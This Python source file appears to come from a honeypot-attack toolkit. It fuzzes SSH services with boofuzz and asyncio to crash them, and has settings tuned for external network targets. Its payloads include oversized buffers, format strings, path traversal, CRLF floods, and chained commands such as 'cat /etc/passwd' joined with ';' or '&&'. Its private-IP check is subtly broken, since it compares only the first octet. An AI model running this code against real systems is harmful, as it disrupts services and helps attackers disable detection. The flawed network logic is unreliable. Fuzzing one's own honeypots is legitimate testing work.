import asyncio
import time
import socket
from typing import List, Tuple

from .base_attack import AttackResults, BaseAttack, BaseHoneypot, TypeAlias
from boofuzz import (Session,
                     Target,
                     SocketConnection,
                     s_initialize,
                     s_string,
                     s_delim,
                     s_get)

FuzzerResults: TypeAlias = tuple[bool, str, int]

"""
Optimized fuzzing for external networks with:
- Async execution for better performance
- Configurable timeouts and batch sizes
- Smart payload generation
- Early termination on honeypot crash
- Network-aware optimizations
- Automatic selection: Local IP = Legacy boofuzz, External IP = Smart fuzzing
"""


class Fuzzing(BaseAttack):
    def __init__(self, honeypot: BaseHoneypot) -> None:
        """
        Initializes a new Fuzzing object.

        Args:
            honeypot (BaseHoneypot): Honeypot object to get information
                                     from for attack.
        """
        super().__init__(honeypot)
        self.max_banner_length: int = 512
        self.max_terminal_length: int = 1024
        
        # Network optimization settings
        self.external_network_timeout: float = 5.0
        self.batch_size: int = 10  # Process payloads in batches
        self.max_concurrent: int = 5  # Limit concurrent connections for external networks
        self.early_termination_checks: int = 5  # Check if honeypot is alive every N payloads

    def is_external_network(self) -> bool:
        """
        Determines if the target is on an external network based on IP.
        
        Returns:
            bool: True if external network, False if local.
        """
        ip = self.honeypot.ip
        # Check for private IP ranges
        private_ranges = [
            ('10.', '10.255.255.255'),
            ('172.16.', '172.31.255.255'),
            ('192.168.', '192.168.255.255'),
            ('127.', '127.255.255.255')
        ]
        
        for start, end in private_ranges:
            if ip.startswith(start.split('.')[0]):
                return False
        return True

    def generate_smart_payloads(self, payload_type: str, max_count: int = 100) -> List[str]:
        """
        Generate smart, targeted payloads instead of full fuzzing for external networks.
        
        Args:
            payload_type (str): Type of payload ('banner' or 'terminal')
            max_count (int): Maximum number of payloads to generate
            
        Returns:
            List[str]: List of targeted payloads
        """
        payloads = []
        
        if payload_type == "banner":
            # SSH banner specific payloads
            base_payloads = [
                "SSH-2.0-",
                "SSH-1.99-",
                "SSH-1.5-",
                "SSH-",
                "",  # Empty banner
            ]
            
            # Add length-based attacks
            for base in base_payloads:
                payloads.extend([
                    base + "A" * 10,
                    base + "A" * 100,
                    base + "A" * 500,
                    base + "\x00" * 10,  # Null bytes
                    base + "\xff" * 10,  # High bytes
                    base + "%" * 20,     # Format string
                    base + "../" * 20,   # Path traversal
                    base + "\r\n" * 10,  # CRLF injection
                ])
                
        elif payload_type == "terminal":
            # Terminal command specific payloads
            base_commands = [
                "ls",
                "pwd",
                "whoami",
                "cat /etc/passwd",
                "exit",
            ]
            
            for cmd in base_commands:
                payloads.extend([
                    cmd + "A" * 100,
                    cmd + "\x00" * 10,
                    cmd + ";" + "A" * 100,
                    cmd + "&&" + "A" * 100,
                    cmd + "|" + "A" * 100,
                    "A" * 1000,  # Buffer overflow attempt
                    "\x00" * 100,  # Null byte injection
                    "%" * 100,   # Format string
                    "\r\n" * 50, # CRLF flood
                    "\xff" * 100, # High byte flood
                ])
        
        return payloads[:max_count]

    async def send_payload_async(self, port: int, payload: str, timeout: float = 3.0) -> bool:
        """
        Asynchronously send a single payload to the target.
        
        Args:
            port (int): Target port
            payload (str): Payload to send
            timeout (float): Connection timeout
            
        Returns:
            bool: True if payload was sent successfully, False otherwise
        """
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.honeypot.ip, port),
                timeout=timeout
            )
            
            writer.write(payload.encode('utf-8', errors='ignore'))
            await writer.drain()
            
            # Try to read response (optional)
            try:
                await asyncio.wait_for(reader.read(1024), timeout=1.0)
            except asyncio.TimeoutError:
                pass  # No response is fine
            
            writer.close()
            await writer.wait_closed()
            return True
            
        except Exception:
            return False

    async def run_smart_fuzzing_async(self, payload_type: str, port: int) -> FuzzerResults:
        """
        Run optimized fuzzing with smart payloads and async execution.
        
        Args:
            payload_type (str): Type of fuzzing ('banner' or 'terminal')
            port (int): Target port
            
        Returns:
            FuzzerResults: Results of the fuzzing attack
        """
        # Adjust parameters for external networks
        if self.is_external_network():
            timeout = self.external_network_timeout
            max_payloads = 50  # Reduced for external networks
            concurrent_limit = 3
            print(f"[~] External network detected, using conservative settings")
        else:
            timeout = 2.0
            max_payloads = 100
            concurrent_limit = self.max_concurrent
        
        payloads = self.generate_smart_payloads(payload_type, max_payloads)
        successful_sends = 0
        
        print(f"[~] Generated {len(payloads)} smart {payload_type} payloads")
        
        # Use semaphore to limit concurrent connections
        semaphore = asyncio.Semaphore(concurrent_limit)
        
        async def send_with_semaphore(payload: str) -> bool:
            async with semaphore:
                return await self.send_payload_async(port, payload, timeout)
        
        # Process payloads in batches for better control
        for i in range(0, len(payloads), self.batch_size):
            batch = payloads[i:i + self.batch_size]
            
            # Send batch concurrently
            results = await asyncio.gather(
                *[send_with_semaphore(payload) for payload in batch],
                return_exceptions=True
            )
            
            successful_sends += sum(1 for r in results if r is True)
            
            # Progress update
            progress = ((i + len(batch)) / len(payloads)) * 100
            print(f"[~] {payload_type.title()} fuzzing progress: {progress:.1f}% "
                  f"({successful_sends} successful sends)")
            
            # Early termination check every few batches
            if i % (self.batch_size * self.early_termination_checks) == 0:
                if not self.is_honeypot_alive():
                    print(f"[+] Honeypot appears to have crashed during {payload_type} fuzzing!")
                    return (True, 
                           f"Honeypot crashed during {payload_type} fuzzing at {progress:.1f}%", 
                           successful_sends)
            
            # Small delay between batches for external networks
            if self.is_external_network():
                await asyncio.sleep(0.1)
        
        return (False, f"{payload_type.title()} fuzzing completed", successful_sends)

    def run_connection_fuzzing(self) -> FuzzerResults:
        """
        Perform optimized connection fuzzing by sending smart SSH banner payloads.

        Returns:
            FuzzerResults: Results of the attack.
        """
        print(f"[~] Starting optimized connection fuzzing...")
        
        for port in self.honeypot.ports:
            if port == 2222 or port == 22:  # SSH ports
                return asyncio.run(self.run_smart_fuzzing_async("banner", port))
        
        return (False, "No suitable SSH ports found for connection fuzzing", 0)

    def run_terminal_fuzzing(self) -> FuzzerResults:
        """
        Perform optimized terminal fuzzing by sending smart command payloads.

        Returns:
            FuzzerResults: Results of the attack.
        """
        print(f"[~] Starting optimized terminal fuzzing...")
        
        for port in self.honeypot.ports:
            if port == 2222 or port == 22:  # SSH ports
                return asyncio.run(self.run_smart_fuzzing_async("terminal", port))
        
        return (False, "No suitable SSH ports found for terminal fuzzing", 0)

    def run_legacy_boofuzz_attack(self, attack_type: str) -> FuzzerResults:
        """
        Run the original boofuzz-based attack as a fallback option.
        
        Args:
            attack_type (str): Either 'banner' or 'terminal'
            
        Returns:
            FuzzerResults: Results of the attack
        """
        try:
            test_cases_executed: int = 0

            for port in self.honeypot.ports:
                if port != 2222:
                    continue
                    
                if attack_type == "banner":
                    s_initialize("fuzz_banner")
                    s_string("SSH", fuzzable=True, max_len=self.max_banner_length)
                    s_delim(":", fuzzable=True)
                    fuzz_name = "fuzz_banner"
                else:  # terminal
                    s_initialize("fuzz_command")
                    s_string("A", fuzzable=True, max_len=self.max_terminal_length)
                    s_delim(":", fuzzable=True)
                    fuzz_name = "fuzz_command"
                
                target = Target(connection=SocketConnection(self.honeypot.ip,
                                                            port,
                                                            proto='tcp'))
                session = Session(target=target, web_port=None, sleep_time=0)
                session.auto_free_clear = True

                session.connect(s_get(fuzz_name))
                session.fuzz()

                test_cases_executed += session.total_mutant_index

            if self.is_honeypot_alive():
                return (False,
                        f"Honeypot is still alive after {attack_type} fuzzing",
                        test_cases_executed)
            else:
                return (True,
                        f"{attack_type.title()} fuzzing completed",
                        test_cases_executed)
        except Exception as e:
            return (False,
                    f"{attack_type.title()} fuzzing failed: {e}",
                    0)

    def run_attack(self, force_method: str = "auto") -> AttackResults:
        """
        Run fuzzing attacks with automatic method selection based on network type.
        Always runs quick crash test first, then proceeds with network-appropriate method.
        
        Args:
            force_method (str): Force specific method. Options:
                               "auto" - Automatically choose based on network (default)
                               "smart" - Force smart fuzzing
                               "legacy" - Force legacy boofuzz
                               "quick_only" - Only run quick crash test

        Returns:
            AttackResults: Results of the attack.
        """
        is_external = self.is_external_network()
        network_type = "external" if is_external else "local"
        
        print(f"[~] Running fuzzing attack on {self.honeypot.ip} ({network_type} network)...")
        start_time: float = time.time()

        # ALWAYS run quick crash test first
        print(f"[~] Running initial quick crash test...")
        for port in self.honeypot.ports:
            if port == 2222 or port == 22:
                crashed = asyncio.run(self.quick_crash_test(port))
                if crashed:
                    end_time = time.time()
                    time_taken = end_time - start_time
                    return (True, 
                           f"Honeypot crashed during initial quick crash test in {time_taken:.2f}s ({network_type} network)", 
                           time_taken, 
                           6)  # Number of crash payloads tested
                break

        # If force_method is "quick_only", stop here
        if force_method == "quick_only":
            end_time = time.time()
            time_taken = end_time - start_time
            return (False, 
                   f"Quick crash test completed - honeypot still alive ({network_type} network)", 
                   time_taken, 
                   6)

        print(f"[~] Quick crash test failed to crash honeypot, proceeding with full fuzzing...")

        # Automatic method selection based on network type
        if force_method == "auto":
            if is_external:
                print(f"[~] External network detected - using smart fuzzing approach")
                use_smart_fuzzing = True
            else:
                print(f"[~] Local network detected - using legacy boofuzz approach")
                use_smart_fuzzing = False
        elif force_method == "smart":
            use_smart_fuzzing = True
            print(f"[~] Forced smart fuzzing mode")
        elif force_method == "legacy":
            use_smart_fuzzing = False
            print(f"[~] Forced legacy boofuzz mode")
        else:
            raise ValueError(f"Invalid force_method: {force_method}")

        if use_smart_fuzzing:
            # Use optimized smart fuzzing for external networks
            success_terminal, message_terminal, test_cases_terminal = self.run_terminal_fuzzing()
            print(f"[~] Terminal fuzzing: {success_terminal}, {message_terminal}")

            # Only run connection fuzzing if terminal fuzzing didn't crash the honeypot
            if not success_terminal and self.is_honeypot_alive():
                success_connection, message_connection, test_cases_connection = self.run_connection_fuzzing()
                print(f"[~] Connection fuzzing: {success_connection}, {message_connection}")
            else:
                success_connection, message_connection, test_cases_connection = False, "Skipped (honeypot crashed)", 0
        else:
            # Use legacy boofuzz method for local networks
            print(f"[~] Using legacy boofuzz fuzzing for local network...")
            success_terminal, message_terminal, test_cases_terminal = self.run_legacy_boofuzz_attack("terminal")
            print(f"[~] Terminal fuzzing: {success_terminal}, {message_terminal}")
            
            success_connection, message_connection, test_cases_connection = self.run_legacy_boofuzz_attack("banner")
            print(f"[~] Connection fuzzing: {success_connection}, {message_connection}")

        end_time: float = time.time()
        time_taken: float = end_time - start_time

        total_cases: int = test_cases_terminal + test_cases_connection + 6  # +6 for quick crash test

        success: bool = success_connection or success_terminal
        attack_method = "smart fuzzing" if use_smart_fuzzing else "legacy boofuzz"
        message: str = f"{message_connection} - {message_terminal} - " \
                       f"{total_cases} test cases executed in {time_taken:.2f}s " \
                       f"({network_type} network, quick test + {attack_method})"

        return (success, message, time_taken, total_cases)

    async def quick_crash_test(self, port: int) -> bool:
        """
        Quick test to see if we can crash the honeypot with minimal payloads.
        
        Args:
            port (int): Target port
            
        Returns:
            bool: True if honeypot appears to have crashed
        """
        # High-impact payloads that commonly crash honeypots
        crash_payloads = [
            "A" * 8192,  # Large buffer
            "\x00" * 1024,  # Null bytes
            "\xff" * 1024,  # High bytes
            "%" * 1024,   # Format string
            "\r\n" * 512, # CRLF flood
            "SSH-99.99-" + "A" * 1000,  # Malformed SSH banner
        ]
        
        print(f"[~] Running quick crash test with {len(crash_payloads)} high-impact payloads...")
        
        for i, payload in enumerate(crash_payloads):
            success = await self.send_payload_async(port, payload, 3.0)
            if success:
                # Wait a moment then check if honeypot is still alive
                await asyncio.sleep(0.5)
                if not self.is_honeypot_alive():
                    print(f"[+] Honeypot crashed on quick test payload {i+1}!")
                    return True
            
            # Small delay between crash attempts
            await asyncio.sleep(0.2)
        
        return False

    def run_attack_with_quick_test(self) -> AttackResults:
        """
        Run attack with initial quick crash test for external networks.
        
        Returns:
            AttackResults: Results of the attack.
        """
        print(f"[~] Starting optimized fuzzing attack with quick crash test...")
        start_time: float = time.time()
        
        # For external networks, try quick crash test first
        if self.is_external_network():
            print(f"[~] External network detected - running quick crash test first...")
            
            for port in self.honeypot.ports:
                if port == 2222 or port == 22:
                    crashed = asyncio.run(self.quick_crash_test(port))
                    if crashed:
                        end_time = time.time()
                        time_taken = end_time - start_time
                        return (True, 
                               f"Honeypot crashed during quick crash test in {time_taken:.2f}s", 
                               time_taken, 
                               6)  # Number of crash payloads tested
        
        # If quick test didn't work, proceed with automatic method selection
        return self.run_attack(force_method="auto")

    def get_optimized_settings(self) -> dict:
        """
        Get network-optimized settings for fuzzing.
        
        Returns:
            dict: Optimized settings based on network type
        """
        if self.is_external_network():
            return {
                "timeout": 8.0,
                "max_payloads": 30,
                "concurrent_limit": 2,
                "batch_size": 5,
                "delay_between_batches": 0.5,
                "early_termination_frequency": 3,
                "method": "smart_fuzzing"
            }
        else:
            return {
                "timeout": 2.0,
                "max_payloads": 100,
                "concurrent_limit": 10,
                "batch_size": 20,
                "delay_between_batches": 0.1,
                "early_termination_frequency": 10,
                "method": "legacy_boofuzz"
            }

    def get_attack_strategy(self) -> str:
        """
        Get the attack strategy that will be used based on network type.
        
        Returns:
            str: Description of the attack strategy
        """
        if self.is_external_network():
            return "Smart fuzzing with targeted payloads (external network optimization)"
        else:
            return "Legacy boofuzz with comprehensive fuzzing (local network optimization)"